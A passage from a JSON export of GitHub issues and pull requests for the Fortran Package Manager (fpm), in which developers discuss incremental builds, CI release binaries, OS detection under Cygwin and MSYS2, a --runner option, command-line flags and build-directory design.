            "text": "This PR contains the required changes to implement incremental rebuilds (Resolves #212):\n\nMoves enumeration of link objects to occur before the backend is called\nAdds source file hashing to determine whether targets need rebuilding\nSeparates target scheduling from target compilation which:\n\nallows unit-testing of backend sorting and scheduling\noptionally allows parallel builds when compiled with openmp (bootstrap: fpm build --flag -fopenmp --flag -O3)",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-28 16:40:02+00:00",
                    "text": "Thanks for reviewing; suggestions applied.\n\nI had a few issues when switching branches with git and rebuilding, but those might also result from incompatible module files left in the build directory\n\nI've been having this issue with the bootstrap version but can't find the source of the problem. I haven't (yet) encountered this problem with this Fortran implementation \u2014 I will look into it for a future PR \ud83d\udc4d"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-28 16:52:36+00:00",
                    "text": "I've been having this issue with the bootstrap version but can't find the source of the problem. I haven't (yet) encountered this problem with this Fortran implementation\n\nMaybe I encountered this while running fpm run -- build, hard to tell exactly which fpm failed, since it was an issue from gfortran complaining about incompatible module files. I cleaned both build directory afterwards (rm -r build/gfortran_*), but we will certainly get the chance to mess the build process up often enough in the future."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-02 10:30:32+00:00",
                    "text": "Many thanks for reviewing; I'll merge later today if there are no more comments."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-02 14:13:24+00:00",
                    "text": "Apparently there is an issue with an old version of Firefox working with the reviews. I thought I had approved this days ago but I noticed it is not checked. Others comments covered my issues so I have no problem with this going forward. Sorry if that caused a delay. Hopefully this works from this browser."
                }
            ]
        },
        {
            "number": 247,
            "user": "awvwgk",
            "date": "2020-11-21 12:09:14+00:00",
            "title": "Refactoring of manifest types",
            "text": "Minor changes for consistency:\n\nmove manifest defaults from fpm to fpm_manifest\nrename all manifest types from *_t to *_config_t, frees names like executable_t or dependency_t.\nnames of instances in package_config_t correspond to table names in manifest",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-25 09:28:51+00:00",
                    "text": "The only semantic change in this PR is a minor refactoring of the package defaults \u2014 everything else is variable naming so I will merge. Thanks @awvwgk"
                }
            ]
        },
        {
            "number": 246,
            "user": "LKedward",
            "date": "2020-11-19 17:23:44+00:00",
            "title": "CI: upload binaries when a release is published",
            "text": "This PR updates the CI so that it is additionally triggered when a github release is published to which it will upload binaries (Linux, Mac, Windows) for both versions of fpm as release assets (example here).\nAs discussed at last month's meeting, this simplifies the bootstrapping process (on the supported platforms) and also simplifies using fpm in your own CI.\nAfter running the usual tests, the CI checks that the release tag, of the form vx.y.z, matches that output by fpm --version;\nbinaries are not uploaded if the release tag does not match (example workflow)\nFor the time being, releases can be created by maintainers at their own discretion as features are added and bugs fixed (I'm happy to do this); in the long term, a release process will need to be discussed and documented.\nI intend to create an initial release (v0.1.0) following this PR.\nResolves #218.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-19 21:40:23+00:00",
                    "text": "One minor thing: Could we generate some SHA256 hashes for each release artefact?\n\nGood point; yep I'll add them in.\n\nAlso, how are prerelease events handled?\n\nThey should be treated the same as a normal release - I'll check tomorrow.\nThanks @milancurcic, yes I agree about the naming - I'll reorder with the actual version number in and add +x permission.\n\n@everythingfunctional, do you know if compilation of statically-linked binaries is possible with Haskell stack?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-21 10:07:24+00:00",
                    "text": "Thanks for reviewing; I've updated the file naming convention as suggested and added hashes for checking integrity.\nUnfortunately I can't seem to preserve executable permissions on the Linux/MacOS binaries when added as assets - I think this may be a limitation (or security feature?) of github."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-21 11:10:24+00:00",
                    "text": "It is probably a security feature. One option to preserve the permissions would be packaging in a tarball/zip archive instead, but this would increase the \u201cinstallation barrier\u201d slightly."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-25 09:34:06+00:00",
                    "text": "If there are no objections or further comments I will merge later today and create an initial release with tag 'v0.1.0'."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-25 16:34:57+00:00",
                    "text": "I've created a tag v0.1.0 and corresponding release, for which the workflow has executed successfully and there are now binaries to download. Since this is the first release, instead of a change-log I have simply summarised the features currently supported in each version."
                }
            ]
        },
        {
            "number": 245,
            "user": "urbanjost",
            "date": "2020-11-19 13:43:25+00:00",
            "title": "should run and test default to listing instead of running all cases and have a --all switch?",
            "text": "I find a more intuitive behavior for run and test if that if there is just one target it runs it; but if there is more than one it just lists the candidates and that you either have to use a new switch --all to get the current behavior or give a list of targets. Does that seem like a necessary change to anyone else? Adding the switch is not much of a burden and if you have dozens of apps or tests right now the only way to get a nice list is to enter a name that does not exist. Another option might be to have a switch like -toc that lists the candidates in the nice table you get when you enter a bad name.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-11-23 17:02:55+00:00",
                    "text": "The other way round it makes more sense to me. I would use a --list option to get all possible targets. I think at least for test that should show the integrity of the project I would prefer to run all tests rather than getting a list (and exit status zero).\nConsider a CI setup with fpm, both fpm test and fpm test --all would return a zero exit status, but the former would only work as expected for projects with a single test target. Together with the automatic discovery of test executables this might lead to surprising outcomes.\nBut it can certainly dependent on the design of the project. After I started using fpm more seriously in my projects, I reconsidered some of my project designs for fpm, leading to overall smaller projects with usually a single executable target per project."
                }
            ]
        },
        {
            "number": 244,
            "user": "urbanjost",
            "date": "2020-11-19 03:05:43+00:00",
            "title": "Alternate directory specifications",
            "text": "There are reasons to be able to specify build directories other than the defaults for building and for searching for dependencies.\nTo reduce duplication and the need to pull dependencies remotely I would suggest that you be able to specify a directory to buil dependencies in via an environment variable, and that you be able to specify a list of directories colon-separated to seach for existing dependencies somewhat like LD_LIBRARY. The ability to specify an alternate build directory that is a full pathname has some security risks if you allow externally created scripts to be used to do the build, but that is a general issue with any blindly trusted script.\nIt would also be useful to add additional directory names in the fpm.toml file to be automatically searched. Personally, in addition to applications and tests I often have demos/examples and program for testing performance. If I decide to place these outside of app/ and /test I then have to list them individually in fpm.toml; but it is very undesirable to have them run if I use \"fpm run\" or \"fpm test\" automatically.\nA third case is for the --flags option. It would be good to be able to specify a directory for a build when using --flags, and that --flags NOT be allowed to build the default and --release builds; and that that directory name (assumed to only be allowed to be a simple name that follows the rules of a Fortran variable name, not a full path name) could then be used with the run and test subcommands to use those executables. So you could do something like fpm build -flag -p -dir profile and then fpm run -dir profile.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-11-19 13:58:20+00:00",
                    "text": "There are reasons to be able to specify build directories other than the defaults for building and for searching for dependencies.\n\nThis is a known weakness of the packaging model of cargo which partly inspired the current fpm behaviour. Cargo has an option to do exactly this kind of thing, reusing dependencies between projects. From my observation this feature was always heavily discouraged because of potential incompatibilities and security risks.\nSharing dependencies between projects will just cost us a lot of work to implement and a lot of pain to maintain and debug. A more sustainable model would certainly be necessary for this purpose.\nI think the main issue is rooted in the static linking approach fpm (and cargo as well) are using. An easy way to fix it is to compile shared objects and link dynamically. The drawback of this approach is that we have to start caring about ABI compatibility between dependency versions as well.\n\nIt would also be useful to add additional directory names in the fpm.toml file to be automatically searched. Personally, in addition to applications and tests I often have demos/examples and program for testing performance. If I decide to place these outside of app/ and /test I then have to list them individually in fpm.toml; but it is very undesirable to have them run if I use \"fpm run\" or \"fpm test\" automatically.\n\nIt could be worth to add [[example]] or [[benchmark]] to the package specification for this purpose. But maybe it is easier to add this property to the existing [[test]] and [[executable]] tables:\n[[test]]\nbenchmark = true\n\n[[executable]]\nexample = true"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-20 03:14:17+00:00",
                    "text": "There might be dependencies specific to the benchmarks or examples that makes me lean towards you first syntax. I was picturing being able to add directory names to be automatically built where the names could be an arbitrary user-supplied list but at least personally my use cases are for those two categories. So would the names be configurable or specifically be \"benchmark\" and \"example\"?\nI am actually a fan of static loading for almost all cases except for \"device interface\" libraries like for MPI and X11; so I would live with the status-quo. I was already concerned with some of the issues a shared directory might present but I think most of them are no worse that what you currently get with shared libraries .\nIf a central repository could only be used with commit keys specified (although that sort of impies the use of git(1) versus some other CVS systems), somwhat like the -r parameter often available on loaders I was thinking most of the problems in such a scheme would be avoided and the alternative could be a large number of copies of dependencies that would be burdensome to update. I think there are a lot of pros to such an approach.\nI was looking for something discussing the cargo issues and whether it was a deprecated cargo feature and a quick search did not find anything. Anything you could refer me to? I already knew there were pros and cons but not being a rust/cargo user I think it would be enlighting. The cargo package seems to be a good model from some references I see that seem to mention it as a better model than other languages have."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-20 07:17:53+00:00",
                    "text": "There is the CARGO_TARGET_DIR environment variable: https://doc.rust-lang.org/cargo/reference/config.html#buildtarget-dir\nIt was suggested recently for usage in the AUR for speeding up packaging, but not well received: https://lists.archlinux.org/pipermail/aur-general/2020-September/035922.html"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-20 14:11:09+00:00",
                    "text": "My biggest use case would be for QA of a large package used by many other fpm packages, especially if the dependency required special build options different than the other parts of the package. After seeing some of the issues raised I guess just installing the dependencies once verified as \"regular\" libraries outside of fpm and then using them with something like the h-fpm --link option would handle that case, but then the package is not fully contained within fpm. So it depends on how I want packages \"installed\" on a machine and the use of external links instead of package dependencies. Pros and cons on both sides of that for me. So I guess this is too early a consideration and for now it seems far clearer if everything is self-contained in the build/ directory I guess; and there is a work-around in that packages can be extracted from fpm and used like any other library.  Picturing a larger project I do not want to have to rebuild something equivalent to X11 Windows or MPI or OpenMP or other large complex libraries for every little program I build that might use them. I could easily picture an fpm packaging of netlib, for example.  So I'm convinced this is not something to do now and can be reconsidered if fpm is successful enough that it is an issue later when things like \"installing\" an fpm package become better defined."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-20 14:44:54+00:00",
                    "text": "I would recommend to look into other build systems.\nWe had gone through a painful porting process for a CMake based project recently, to allow dynamically linking against projects that were previously repackaged and statically linked. The overall process was not pleasant at all and let to a lot of boilerplate CMake code.\nI made better experiences with meson regarding dependencies so far, the meson-wrap tool allows to define subprojects (quite similar in the way fpm handles dependencies right now) as fallbacks if the dependency is not found on the host system. This works nicely for me, since I usually use the fallback for local development and still have the possibility to create separate packages for distribution.\nSuch a dependency / fallback system could be implemented by a local fpm-registry."
                }
            ]
        },
        {
            "number": 243,
            "user": "urbanjost",
            "date": "2020-11-19 02:20:51+00:00",
            "title": "Suggest including short arguments for the major long subcommand options [fortran fpm]",
            "text": "Currently the syntax of f-fpm subcommands sans --help and\n--version consists of the following:\n    build [--release] [--list] [--flag COMPILER_OPTIONS]\n    help [NAME(s)]\n    new NAME [--lib|--src] [--app] [--test] [--backfill]\n    list [--list]\n    run [NAME(s)] [--release] [--runner \"CMD\"] [--list] [-- ARGS]\n    test [NAME(s)] [--release] [--runner \"CMD\"] [--list] [-- ARGS]\n\nSuggest allowing short names as well as long names at least for\nthe most commonly interactively used options, as in\n    build [--release|-r] [--list|-l] [--flag|-f COMPILER_OPTIONS]\n    help [NAME(s)]\n    new NAME [--lib|-l|--src|-s] [--app|-a] [--test|-t] [--backfill|-b]\n    list [--list|-l]\n    run [NAME(s)] [--release|-r] [--runner|-c \"CMD\"] [--list|-l] [-- ARGS]\n    test [NAME(s)] [--release|-r] [--runner|-c \"CMD\"] [--list|-l] [-- ARGS]\n\nThat is,\n   --app, `-a`\n   --backfill, `-b`\n   --help, `-h`\n   --lib, `-l`\n   --list, `-l `\n   --release, `-r`\n   --runner, `-c`\n   --src, `-s`\n   --test, `-t`\n   --version, `-v`\n\nLooking at cargo it allows short names for several options, but not all.\nSome commands like stack appear to only allow a few short options, like\n-j and -v. Some commands like git allow a lot of short options. In git's case it is only\nfor the more common options on each subcommand; but  note git(1) has an elaborate aliasing\nscheme that allows users to make aliases; including an internal scripting\nlanguage.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-11-19 13:48:43+00:00",
                    "text": "Adding short flags should be done sparsely, while it might be convenient we only got a limited amount of them. I would favour a more careful design of the command line arguments in the first place, arguments that are expected to be used frequently should be easier/shorter to type."
                }
            ]
        },
        {
            "number": 242,
            "user": "urbanjost",
            "date": "2020-11-17 00:02:04+00:00",
            "title": "OS detection is faulty",
            "text": "Running in a CygWin environment I had to unset the environment variable OS which was set for the MSWIndows applications and inherited by the CygWin application in order for the routine testing for system type to identify the environment as a CygWin/POSIX environment instead of a default MSWindows environment. Looks like the routine automatically assumes if the OS variable is set it is MSWindows.   At least need a note to that effect somewhere; but might want to change the test. Specifically for CygWin there are several environment variables and the /usr/bin/cyg* commands that can be tested for without having to call platform-specific C routines if anyone wants a list. The routine identifying the platform is slated for replacement by a stdlib routine I believe, but that might be a ways off.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-17 13:36:53+00:00",
                    "text": "The Windows check (using 'OS'):\n\n  \n    \n      fpm/fpm/src/fpm_environment.f90\n    \n    \n        Lines 36 to 39\n      in\n      c68cf2f\n    \n    \n    \n    \n\n        \n          \n           if (rc == 0 .and. length > 0 .and. index(val, 'Windows_NT') > 0) then \n        \n\n        \n          \n               r = OS_WINDOWS \n        \n\n        \n          \n               return \n        \n\n        \n          \n           end if \n        \n    \n  \n\n\noccurs before the cygwin check (using 'OSTYPE'):\n\n  \n    \n      fpm/fpm/src/fpm_environment.f90\n    \n    \n        Lines 64 to 67\n      in\n      c68cf2f\n    \n    \n    \n    \n\n        \n          \n           if (index(val, 'cygwin') > 0) then \n        \n\n        \n          \n               r = OS_CYGWIN \n        \n\n        \n          \n               return \n        \n\n        \n          \n           end if \n        \n    \n  \n\n\nbut since cygwin imports all Windows environment variables, the Windows check will take precedence over the cygwin one and always return OS_WINDOWS.\nA possible fix could be to check the environment variable 'OS' after 'OSTYPE' and not before - what do you think @interkosmos?"
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-11-17 13:40:42+00:00",
                    "text": "I just checked: Cygwin defines OSTYPE (to be \"cygwin\") whereas plain\nWindows does not define it - instead it uses OS. So the logic should take\nthat non-existence into account. But checking OSTYPE first seems a\nreasonable solution.\n\nOp di 17 nov. 2020 om 14:37 schreef Laurence Kedward <\nnotifications@github.com>:\n\u2026\n The Windows check (using 'OS'):\n\n https://github.com/fortran-lang/fpm/blob/c68cf2fbdb40c33636bd50b6a729490ae9d61654/fpm/src/fpm_environment.f90#L36-L39\n\n occurs before the cygwin check (using 'OSTYPE'):\n\n https://github.com/fortran-lang/fpm/blob/c68cf2fbdb40c33636bd50b6a729490ae9d61654/fpm/src/fpm_environment.f90#L64-L67\n\n but since cygwin imports all Windows environment variables\n <https://cygwin.com/cygwin-ug-net/setup-env.html>, the Windows check will\n take precedence over the cygwin one and always return OS_WINDOWS.\n\n A possible fix could be to check the environment variable 'OS' after\n 'OSTYPE' and not before - what do you think @interkosmos\n <https://github.com/interkosmos>?\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#242 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR2ALYVCXMPTJ4X7QX3SQJ4AJANCNFSM4TX3JB5A>\n ."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-11-17 13:44:23+00:00",
                    "text": "Hm, MinGW poses another complication: if started as mingw64.exe you have a\nLinux-like environment under Windows that is compatible with plain Windows,\nwhereas msys64.exe takes you closer to Linux. The two environment variables\ndo not allow you to distinguish the two, though I think mingw64.exe is the\npreferred environment\n\nOp di 17 nov. 2020 om 14:40 schreef Arjen Markus <arjen.markus895@gmail.com\n\u2026\n:\n I just checked: Cygwin defines OSTYPE (to be \"cygwin\") whereas plain\n Windows does not define it - instead it uses OS. So the logic should take\n that non-existence into account. But checking OSTYPE first seems a\n reasonable solution.\n\n Op di 17 nov. 2020 om 14:37 schreef Laurence Kedward <\n ***@***.***>:\n\n> The Windows check (using 'OS'):\n>\n> https://github.com/fortran-lang/fpm/blob/c68cf2fbdb40c33636bd50b6a729490ae9d61654/fpm/src/fpm_environment.f90#L36-L39\n>\n> occurs before the cygwin check (using 'OSTYPE'):\n>\n> https://github.com/fortran-lang/fpm/blob/c68cf2fbdb40c33636bd50b6a729490ae9d61654/fpm/src/fpm_environment.f90#L64-L67\n>\n> but since cygwin imports all Windows environment variables\n> <https://cygwin.com/cygwin-ug-net/setup-env.html>, the Windows check\n> will take precedence over the cygwin one and always return OS_WINDOWS.\n>\n> A possible fix could be to check the environment variable 'OS' after\n> 'OSTYPE' and not before - what do you think @interkosmos\n> <https://github.com/interkosmos>?\n>\n> \u2014\n> You are receiving this because you are subscribed to this thread.\n> Reply to this email directly, view it on GitHub\n> <#242 (comment)>,\n> or unsubscribe\n> <https://github.com/notifications/unsubscribe-auth/AAN6YR2ALYVCXMPTJ4X7QX3SQJ4AJANCNFSM4TX3JB5A>\n> .\n>"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-17 14:00:46+00:00",
                    "text": "Yes I agree with you @arjenmarkus. To distinguish between the mingw64.exe shell and the msys64.exe shell there should be an 'MSYSTEM' environment variable set to 'MINGW64' and 'MSYS' for the two different shells respectively.\n\nAside: as an example why the two shells should be treated differently, execute_command_line will call the msys bash shell in msys64.exe but call the Windows cmd shell in mingw64.exe. Hence msys should be treated like Linux and mingw64 like Windows."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-30 12:19:23+00:00",
                    "text": "I had a look at running fpm under MSYS2 and realised there's another problem with the OS detection routine. The routine looks for the OSTYPE environment variable, however OSTYPE is a bash variable and not a common environment variable. Hence the current implementation is actually unable to identify OS_WINDOWS, OS_CYGWIN, or OS_SOLARIS."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-30 22:42:05+00:00",
                    "text": "Yes, noticed that too but you can do an \"export OSTYPE\"  and \"unset OS\" as a work-around in your .bashrc as a work-around for Cygwin. If fpm is to support some form of pre-processing OSTYPE in one form or another would be a useful one to have set as well.  Not sure if there is a stdlib routine to do this in the works. perhaps a work-around is to assume fpm is compiled with GNU and to add a C routine that looks for gnu_linux and linux and similar variables instead of re-creating something for now.  A lot more predefined variables exist for gcc than gfortran for some reason. The main reason I think the code is looking for what OS it is it to determine a file separator character, which I think I have a routine for that just uses INQUIRE and a few other things on the pathname returned for ARG0 to figure out the seperator character as another alternative.\ncpp -dM /dev/null"
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-31 10:15:26+00:00",
                    "text": "I agree it would be good for fpm to define some preprocessor variables such as OSTYPE, it's frustrating that many useful variables defined in cpp are excluded from gfortran for no good reason.\nHowever, for fpm we need to detect OSTYPE at runtime due to complications with the various possible Windows systems; in particular, 'plain Windows' binaries (currently supported) can run on msys2/cygwin but run into issues with our filesystem routines implemented via shell commands.\n\nThe main reason I think the code is looking for what OS it is it to determine a file separator character\n\nYes, also to add the .exe suffix on Windows and to determine which shell command to execute for our filesystem routines (to be replaced).\nActually determining which shell command to run at the moment is the main problem on msys2/cygwin, once these routines are replaced with c calls, we should then only need to distinguish *nix from Windows at runtime."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-31 19:33:44+00:00",
                    "text": "In\nhttps://github.com/urbanjost/M_io\nI have two routines (which(3f) and separator(3f)) which might be useful, but I have not tested them in several of those environments. The separator procedure tries to use standard Fortran and an INQUIRE on arg0 to determine if a backslash is\nbeing used or a slash as a separator, which(3f) tries to use the PATH environment variable to see if a command is in the current path. Otherwise, maybe bundling a little C program and executing like a system command (and assuming gfortran and GNU cpp) would work well."
                }
            ]
        },
        {
            "number": 241,
            "user": "14NGiestas",
            "date": "2020-11-16 22:52:33+00:00",
            "title": "Fix docs CI failing #240",
            "text": "I didn't found any set-env command in the JamesIves repo (It is all typescript), so maybe bumping the version fixes the issue.\nEDIT: yep that was it.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-11-17 08:53:34+00:00",
                    "text": "This is a small change to fix a problem, so I will merge."
                }
            ]
        },
        {
            "number": 240,
            "user": "everythingfunctional",
            "date": "2020-11-16 18:13:57+00:00",
            "title": "Doc Workflow Fails",
            "text": "The doc workflow introduced in #237 appears not to be working. @awvwgk , any chance you can take a closer look and find out what went wrong? You can find the workflow that failed here.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-11-16 21:29:28+00:00",
                    "text": "Same with stdlib API docs."
                },
                {
                    "user": "14NGiestas",
                    "date": "2020-11-16 22:31:42+00:00",
                    "text": "The fpm workflow uses this one JamesIves/github-pages-deploy-action, funny thing I have to fix it there."
                },
                {
                    "user": "14NGiestas",
                    "date": "2020-11-16 23:02:30+00:00",
                    "text": "I just bumped the version to the latest one and it seemed to work, can someone please verify if it fixes the issue?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-17 09:01:41+00:00",
                    "text": "Closed with #241"
                }
            ]
        },
        {
            "number": 239,
            "user": "urbanjost",
            "date": "2020-11-15 17:44:48+00:00",
            "title": "Add --runner option to Fortran fpm to match Haskell fpm",
            "text": "This option already exists in the Haskell version. It helps reduce the need\nfor the user to interact directly with the build/ directory, which ideally\nshould be a black box as far as the user is concerned.\n --runner CMD   A command to prefix the program execution paths with.\n            For use with utilities like valgrind(1), time(1), and\n            other utilities that launch executables; commands that\n            inspect the files like ldd(1), file(1), and ls(1); and\n            that copy or change the files like strip(1) and install(1).\n\nEXAMPLES\n  # install executables in directory (assuming install(1) exists)\n  fpm run -c 'install -b -m 0711 -p -t /usr/local/bin'",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-11-17 19:40:36+00:00",
                    "text": "M_CLI2 is basically one call to define command and crack command line and then two different ways to query the option values. It looks different because the names are in the form  --LONGNAME:SHORTNAME. Otherwise it is used by essentially typing the command as you would use it except that all values must be specified and that logicals must be given a value of F or T and strings must be double-quoted.  The short names are not listed in the documentation yet so if no one wants short names I will remove them; but you should be able to enter:\nfpm new A -la \nfpm run -c 'gdbg'\nfpm -l\nRight now to see them you can use the --usage|-u switch\nfpm new --usage"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-18 09:23:43+00:00",
                    "text": "Thanks for explaining, the command line code is making sense to me now. I don't mind introducing short names, though it might be better to use a separate PR for them so they can be discussed."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-19 01:33:58+00:00",
                    "text": "Removed short argument names. Will create a new PR for that discussion"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-20 08:52:59+00:00",
                    "text": "Was waiting to see if anyone complained about --runner just providing a simple prefix syntax.\n\nFunnily enough I did require this capability to copy the executable file elsewhere; but because the command is constructed simply as a concatenated shell string, I simply passed the remaining postfix arguments as ARGS after --.\ne.g.\n$ fpm run --runner cp -- /path/to/destination/\nWhile not the intended syntax, I started conceptualising -- as the executable substitution. Though obviously one must be careful which arguments go before and after -- for the intended behaviour."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-20 14:52:17+00:00",
                    "text": "Huh.  \"Every capability becomes a feature whether intended or not\". Clever thought. Did not even occur to me there is already a \"prefix\" filename \"suffix\" syntax there.   I was picturing something like  fpm run -runner 'cp %FNAME /path/to/destination' of course.  Trying to think of any reason not to show your \"feature\" as an example.  If --runner is excepted I was thinking it deserves a separate \"help\" page, where the test/run help would say \"see fpm help runner for further information\" and could show using it with gdb, install, some_non-GNU-command, ... .  that had me thinking about the pros and cons of the help text being built into the fpm program itself, but I think for now that is OK."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-20 15:02:24+00:00",
                    "text": "@LKedward , that is exactly what I had in mind when I added the --runner option. I'm pretty sure mentioned as much in one of my comments some where. Glad to know I'm not the only one who noticed it. ;)"
                }
            ]
        },
        {
            "number": 238,
            "user": "urbanjost",
            "date": "2020-11-15 16:57:56+00:00",
            "title": "Add --runner command to Fortran fpm to match bootstrap fpm",
            "text": "Add the --runner switch to the run and test subcommands on f-fpm. This was recently added to the h-fpm command. It allows for more intuitive use of a command prefix than\nfpm run --list|xargs -iXX  cmd XX ###INTEROGATE\nparticularly since xargs(1) probably is only available on GNU/Linux, Cygwin, and Unix platforms.\nCommon use cases for fpm run|test --runner \"COMMAND\" include using the following commands:\nCommon GNU/Linux and Unix commands\n\nnm         - list symbols from object files\nsize       - list section sizes and total size.\nldd        - print shared object dependencies\nls         - list directory contents\nstat       - display file or file system status\nfile       - determine file type\n\nPERFORMANCE\n\nvalgrind   - a suite of tools for debugging and profiling programs\ntime       - time a simple command or give resource usage\ntimeout    - run a command with a time limit\n\nCOPY\n\ninstall    - copy files and set attributes\ntar        - an archiving utility\n\nALTER\n\nrm         - remove files or directories\nchmod      - change permissions of a file\n\n  fpm run -c  'install -b -m 0711 -p -t /usr/local/bin'\n  fpm run --runner \"tar cvfz $HOME/bundle.tgz\"\n  fpm run --runner ldd\n  fpm run --runner strip",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-11-15 18:01:12+00:00",
                    "text": "Added pull request #239 as a proposed implementation. The --runner CMD  command is used simply as a prefix.  Was considering that if the cmd include the strings %NAME and %BNAME that it would do a substitute for those strings using the name and basename of the name respectively to allow for commands where the filename does not appear at the end, but for consistency unless a strong use case is made for such a feature I chose to just use it as a prefix for consistency between the versions."
                }
            ]
        },
        {
            "number": 237,
            "user": "awvwgk",
            "date": "2020-11-10 21:52:01+00:00",
            "title": "Add workflow to build and deploy documentation",
            "text": "Adds a workflow to build and deploy the fpm documentation (based on workflow I use in toml-f):\n\nbuild documentation with ford (branch and PR)\ndeploy on master to branch gh-pages branch in same repository\n\nTODO\n\nmight require somebody with owner rights to add API-tokens",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-11-11 19:29:26+00:00",
                    "text": "Great, thank you! Once this is in, where will the docs be available? fortran-lang.github.io/fpm?\nShould we set up a fpm.fortran-lang.org subdomain like we have for stdlib.fortran-lang.org?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-14 16:48:20+00:00",
                    "text": "Should now be visible at https://fortran-lang.github.io/fpm, probably needs a bit of more content. Migration to https://fpm.fortran-lang.org is still required."
                }
            ]
        },
        {
            "number": 236,
            "user": "rouson",
            "date": "2020-11-10 04:10:34+00:00",
            "title": "fix(install): remove additional bashisms",
            "text": "This pull request makes the edits suggested at\nhttps://github.com/fortran-lang/fpm/pull/216#pullrequestreview-518403499",
            "comments": []
        },
        {
            "number": 235,
            "user": "urbanjost",
            "date": "2020-11-09 20:41:50+00:00",
            "title": "[Fortran fpm]  Add support for command-line specification of compiler options",
            "text": "The h-fpm version allows compiler options on the command line. I would propose allowing the same capability but using the\nsyntax\nfpm build [NAME(S)] [-release] -- ARGS\nwhere ARGS could be multiple compiler options.\n\nAny feedback on use cases for the feature, and comments on the h-fpm option would be informative as to whether this option should be added or not.\nshould the options replace all the options sans the ones required for the build (ie. -J, -I, ...) or be in addition to the default options?\nI think the documentation should indicate that this potentially breaks a package being self-describing, as it would be problematic to have required options on external dependencies. It  would be useful for building a top-level package with different options.  Options for profiling come to mind, as well as external system libraries. Other options are being discussed to handle the compile and load options as something provided in the manifest file but there will probably always be a case for supplying various options while developing a package.\nThe h-fpm version hashes the options to create a unique pathname for each combination of switches. That is an option here ; as well as requiring a user-supplied name ;or still being built in the standard location. Not sure what the general sentiment is about that.  Using the hash resolves all kinds of collision problems but could be hard to remember and duplicate unless the hash is reversible and tagged with a name for reuse.\nshould the options only apply to an application and not external dependencies and files in src/? Should there be an option to control what it applies to?  Would a rebuild of all package components be required?\nshould the syntax be the same in both the f-fpm and h-fpm packages or is it an advantage to allow for two syntaxes (and underlying implementation differences) for exploring more possibilities?",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-09 21:04:41+00:00",
                    "text": "Just a note, if you tie the build directory to the compiler options, as I've done for h-fpm, then you have to pass the same options to fpm run, or it will (re)build and run a different version.\nI don't know that the CLI for h-fpm and f-fpm must be identical. I think a little bit of experimentation in this area can help us find a more optimal solution. Ideally they should be similar and converge to the same, but don't have to be identical initially."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-12 07:31:39+00:00",
                    "text": "We were discussing using another command for this over at #220. There is cargo-rustc for Rust, which essentially allows to build using the syntax you proposed. A similar command for fpm could be fpm-compile.\nTo solve the issue with the arguments for the other build modes, fpm-compile could allow to build and run targets just like the fpm-run and fpm-test:\nfpm compile [--run|--test target] [--compiler name] [-- [args]...]\n\nIn contrast fpm-build would require a defined profile in the package manifest."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-12 15:19:17+00:00",
                    "text": "I like it, but it's missing two aspects.\n\nSpecifying the runner (like #221)\nSpecifying the target arguments\n\nFor 1, I would just add the --runner argument. For 2, I think using the [-- [args]] for that, and then adding a --flags argument that takes a string with all the flags might be the better way to go. In fact, I may switch to that for #220 (or a future PR, I haven't decided)."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-19 03:23:02+00:00",
                    "text": "I have a version ready that currently assumes\n#238 and #243 are implemented. It would be trivial to remove\nthe dependencies but it logically follows #238 and the Haskell\nversion of --flag; and becomes much cleaner if the --dir option\ndiscussed in #244 (but not implemented in my current implementation)\nis accepted.\nThe version I have ready just applies the options to the debug version\nunless --release is specified in which case it applies to the release\nversion. I do not consider that ideal but it is useful and allows for\nbuilds that would otherwise require the support of options in the fpm.toml\nfile or custom build scripts, such as allowing for X11 libraries or other\nexternal libraries.\nLean towards there being two options, one for compiles and one for\nloads but for now matching the current proposal to some extent (but that\nautomatically builds in an alternate directory) seems needed."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-23 09:31:31+00:00",
